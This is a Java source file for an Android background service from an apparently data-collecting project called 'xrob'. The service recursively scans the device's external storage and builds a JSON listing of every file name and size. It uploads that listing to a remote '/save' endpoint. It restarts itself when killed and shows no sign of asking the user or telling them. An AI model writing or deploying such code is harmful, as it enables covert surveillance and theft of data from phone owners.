package com.theah64.xrob.services;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

public class FileWalkerService extends Service {

    private static final String KEY_PATH_TO_WALK = "path_to_walk";

    private static class FileWalker {
        private static final String KEY_FILES = "files";
        private static final String KEY_SIZE = "size";
        private static final String KEY_NAME = "name";

        private final File root;

        public FileWalker(String root) {
            this(new File(root));
        }

        FileWalker(File root) {
            this.root = root;
        }

        JSONArray walk() throws JSONException {
            return read(scan(this.root));
        }

        static class FileNode {

            private final String name;
            private final List<FileNode> files;
            private final long sizeInKb;

            FileNode(String name, List<FileNode> files, long sizeInKb) {
                this.name = name;
                this.files = files;
                this.sizeInKb = sizeInKb;
            }

            public String getName() {
                return name;
            }

            List<FileNode> getFiles() {
                return files;
            }

            long getSizeInKb() {
                return sizeInKb;
            }
        }

        private static JSONArray read(List<FileNode> fileNodes) throws JSONException {
            if (fileNodes != null) {
                final JSONArray jaFiles = new JSONArray();
                for (final FileNode fn : fileNodes) {
                    final JSONObject joFn = new JSONObject();
                    if (fn.getFiles() != null) {
                        joFn.put(KEY_FILES, read(fn.getFiles()));
                    }
                    joFn.put(KEY_SIZE, fn.getSizeInKb());
                    joFn.put(KEY_NAME, fn.getName());
                    jaFiles.put(joFn);
                }
                return jaFiles;
            }
            return null;
        }

        private static List<FileNode> scan(File root) {

            if (root.isDirectory()) {
                final List<FileNode> rootFileNodes = new ArrayList<>();

                for (final File file : root.listFiles()) {
                    rootFileNodes.add(new FileNode(file.getName(), scan(file), (file.length() / 1024)));
                }

                return rootFileNodes;

            }
            return null;
        }
    }

    public FileWalkerService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        //Collections.reverse(fileNodes);
        Log.d("X", "File walker started");

        String pathToSync = intent.getStringExtra(KEY_PATH_TO_WALK);
        if (pathToSync == null) {
            pathToSync = Environment.getExternalStorageDirectory().toString();
        }

        try {
            final JSONArray jaFiles = new FileWalker(pathToSync).walk();
            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey) {

                    //Building request
                    assert jaFiles != null;
                    final Request contactsRequest = new APIRequestBuilder("/save", apiKey)
                            .addParam(Xrob.KEY_ERROR, "false")
                            .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_FILES)
                            .addParam(Xrob.KEY_MESSAGE, "Files retrieved")
                            .addParam(Xrob.KEY_DATA, jaFiles.toString())
                            .build();


                    OkHttpUtils.getInstance().getClient().newCall(contactsRequest).enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            e.printStackTrace();
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {

                            try {

                                new APIResponse(OkHttpUtils.logAndGetStringBody(response));

                            } catch (JSONException | APIResponse.APIException e) {
                                e.printStackTrace();
                            }
                        }
                    });

                }

                @Override
                public void onFailed(String reason) {

                }
            });
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

}
